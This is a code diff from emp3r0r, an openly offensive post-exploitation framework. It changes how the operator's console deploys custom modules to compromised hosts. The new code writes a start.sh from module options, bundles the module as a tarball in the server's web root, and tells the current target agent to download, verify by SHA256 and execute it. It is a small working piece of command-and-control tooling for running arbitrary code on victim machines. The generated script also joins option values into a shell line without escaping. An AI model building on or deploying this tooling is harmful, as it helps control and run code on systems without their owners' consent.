@@ -4,11 +4,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"os"
 	"strconv"
 	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/olekukonko/tablewriter"
 )
@@ -42,36 +42,35 @@ var ModuleConfigs = make(map[string]ModConfig, 1)
 
 // moduleCustom run a custom module
 func moduleCustom() {
-	config_json := ModuleDir + CurrentMod + "/config.json"
-	temp_config_json := Temp + "/config.json"
-	// update config.json
-	util.Copy(config_json, temp_config_json)
-	defer os.Rename(temp_config_json, config_json)
-	config, err := readModCondig(temp_config_json)
-	if err != nil {
-		CliPrintError("Read config: %v", err)
+	start_sh := ModuleDir + CurrentMod + "/start.sh"
+	config, exists := ModuleConfigs[CurrentMod]
+	if !exists {
+		CliPrintError("Config of %s does not exist", CurrentMod)
 		return
 	}
 	for opt, val := range config.Options {
 		val[0] = Options[opt].Val
 	}
-	err = writeModCondig(config, config_json)
+	err = genStartScript(&config, start_sh)
 	if err != nil {
-		CliPrintError("Update config.json: %v", err)
+		CliPrintError("Generating start.sh: %v", err)
 		return
 	}
 
 	// compress module files
-	err = util.TarBz2(ModuleDir+CurrentMod, WWWRoot+CurrentMod)
+	tarball := WWWRoot + CurrentMod + ".tar.bz2"
+	err = util.TarBz2(ModuleDir+CurrentMod, tarball)
 	if err != nil {
 		CliPrintError("Compressing %s: %v", CurrentMod, err)
 		return
 	}
 
 	// tell agent to download and execute this module
-	err = SendCmdToCurrentTarget("!custom_module "+CurrentMod, "")
+	checksum := tun.SHA256SumFile(tarball)
+	cmd := fmt.Sprintf("!custom_module %s %s", CurrentMod, checksum)
+	err = SendCmdToCurrentTarget(cmd, "")
 	if err != nil {
-		CliPrintError("Sending command to %s: %v", CurrentTarget.Tag, err)
+		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
 	}
 }
 
@@ -166,16 +165,16 @@ func readModCondig(file string) (pconfig *ModConfig, err error) {
 	return
 }
 
-// writeModCondig read config.json of a module
-func writeModCondig(config *ModConfig, outfile string) (err error) {
-	// parse the json
-	data, err := json.Marshal(config)
-	if err != nil {
-		return fmt.Errorf("failed to marshal JSON config: %v", err)
+// genStartScript read config.json of a module
+func genStartScript(config *ModConfig, outfile string) (err error) {
+	data := ""
+	for opt, val_help := range config.Options {
+		data = fmt.Sprintf("%s %s=%s ", data, opt, val_help[0])
 	}
+	data = fmt.Sprintf("%s ./%s ", data, config.Exec) // run with environment vars
 
 	// write config.json
-	return ioutil.WriteFile(outfile, data, 0600)
+	return ioutil.WriteFile(outfile, []byte(data), 0600)
 }
 
 func updateModuleHelp(config *ModConfig) error {
